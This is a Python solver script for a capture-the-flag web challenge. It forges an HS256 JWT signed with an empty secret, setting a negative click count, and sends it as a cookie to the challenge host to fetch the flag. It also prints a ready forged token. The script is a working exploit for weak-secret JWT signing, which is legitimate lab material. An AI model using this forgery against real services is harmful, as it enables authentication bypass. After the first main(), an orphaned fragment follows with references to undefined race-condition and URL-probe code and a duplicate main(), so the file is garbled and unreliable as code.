#!/usr/bin/env python3
"""
Lower Numbers Web Challenge Solver
SOLVED: JWT manipulation with negative count values

Solution:
1. The application uses JWT tokens to store the click count
2. The JWT secret is an empty string ("")
3. By forging a JWT with count=-1, we can access the flag
4. The hint "only consider the negative number" was key

Working JWT with count=-1:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb3VudCI6LTF9.9VBxY0JLEIjg0ihGZ0ZxRIoXT74pCQS7YZbFZsfpRk8

Flag: [REDACTED]
"""

import requests
import time
import base64
import json
import hmac
import hashlib

def create_jwt_with_count(count, secret=""):
    """Create a JWT with specified count using the secret"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"count": count}
    
    # Encode header and payload
    header_json = json.dumps(header, separators=(',', ':'))
    header_b64 = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')
    
    payload_json = json.dumps(payload, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')
    
    # Create signature
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    return f"{header_b64}.{payload_b64}.{signature_b64}"

def solve_lower_numbers():
    print("� Lower Numbers Challenge Solver")
    print("=" * 50)
    
    base_url = "https://cpp.bootupctf.net:8085"
    
    print("🎯 SOLUTION: JWT Manipulation with Negative Count")
    print("Key insight: The hint 'only consider the negative number' points to JWT manipulation")
    print()
    
    # Create JWT with count=-1 and empty secret
    secret = ""  # Empty string secret (common vulnerability)
    count = -1   # Negative count as per hint
    
    jwt_token = create_jwt_with_count(count, secret)
    print(f"🔐 Created JWT with count={count}, secret='{secret}'")
    print(f"JWT: {jwt_token}")
    print()
    
    # Test the JWT
    cookies = {'d': jwt_token}
    
    try:
        # Check main page
        print("🔍 Testing main page...")
        response = requests.get(base_url, cookies=cookies, timeout=10)
        
        import re
        count_match = re.search(r'Count:\s*(-?\d+)', response.text)
        displayed_count = int(count_match.group(1)) if count_match else None
        
        print(f"Server shows count: {displayed_count}")
        
        if displayed_count is not None and displayed_count < 0:
            print("✅ Negative count achieved!")
            
            # Get the flag
            print("\n🚩 Accessing flag...")
            flag_response = requests.get(f"{base_url}/flag", cookies=cookies, timeout=10)
            
            # Extract flag
            flag_patterns = [
                r'flag:\s*<pre>([^<]+)</pre>',
                r'[a-zA-Z0-9_]+\{[^}]+\}',
                r'ctf\{[^}]+\}',
            ]
            
            flag_found = None
            for pattern in flag_patterns:
                matches = re.findall(pattern, flag_response.text, re.IGNORECASE)
                if matches:
                    flag_found = matches[0]
                    break
            
            if flag_found:
                print(f"� FLAG FOUND: {flag_found}")
                return flag_found
            else:
                print(f"Flag response: {flag_response.text}")
                return "FLAG_IN_RESPONSE"
        else:
            print("❌ Count is not negative")
            return None
            
    except Exception as e:
        print(f"❌ Error: {e}")
        return None

def main():
    flag = solve_lower_numbers()
    
    if flag:
        print(f"\n🎉 Challenge Solved!")
        print(f"Flag: {flag}")
        print(f"\n📝 Summary:")
        print(f"- Challenge exploited JWT with empty string secret")
        print(f"- Used negative count (-1) to bypass the 'too many clicks' restriction") 
        print(f"- Hint 'only consider the negative number' was crucial")
    else:
        print(f"\n🤔 Solution attempt failed")

if __name__ == "__main__":
    main()
        
        response = race_session.get(base_url)
        count = extract_count(response.text)
        print(f"After 100 rapid adds: Count = {count}")
        
        # Check if integer overflow occurred
        if count < 0:
            print(f"🎯 Integer overflow detected! Trying flag...")
            flag_response = race_session.get(f"{base_url}/flag")
            flag = check_for_flag(flag_response.text)
            if flag:
                return flag
                
    except Exception as e:
        print(f"Race condition test failed: {e}")
    
    # Try URL manipulation
    print("\n🌐 Testing URL manipulation...")
    url_tests = [
        "/add/-1", "/add?-1", "/add#-1", "/add%2D1"
    ]
    
    for url_test in url_tests:
        try:
            response = session.get(f"{base_url}{url_test}")
            main_response = session.get(base_url)
            count = extract_count(main_response.text)
            print(f"URL test {url_test}: Count = {count}")
            
            if count < 0:
                flag_response = session.get(f"{base_url}/flag")
                flag = check_for_flag(flag_response.text)
                if flag:
                    return flag
        except:
            continue
    
    return None

def extract_count(html):
    """Extract the count value from HTML"""
    import re
    match = re.search(r'Count:\s*(-?\d+)', html)
    if match:
        return int(match.group(1))
    return None

def check_for_flag(response_text):
    """Check if response contains a flag"""
    import re
    
    # Look for flag patterns
    flag_patterns = [
        r'[a-zA-Z0-9_]+\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'bootup\{[^}]+\}',
        r'mne\{[^}]+\}',
    ]
    
    for pattern in flag_patterns:
        matches = re.findall(pattern, response_text, re.IGNORECASE)
        if matches:
            print(f"🚩 FLAG FOUND: {matches[0]}")
            return matches[0]
    
    # Check if response indicates success
    if "congratulations" in response_text.lower() or "flag" in response_text.lower():
        print(f"Flag response content: {response_text}")
        return "FLAG_IN_RESPONSE"
    
    return None

def main():
    flag = solve_lower_numbers()
    
    if flag:
        print(f"\n🎉 Challenge Solved!")
        print(f"Flag: {flag}")
    else:
        print(f"\n🤔 Could not automatically solve. Manual investigation required.")
        print(f"Hint: Need to find a way to make the count negative or very low.")

if __name__ == "__main__":
    main()
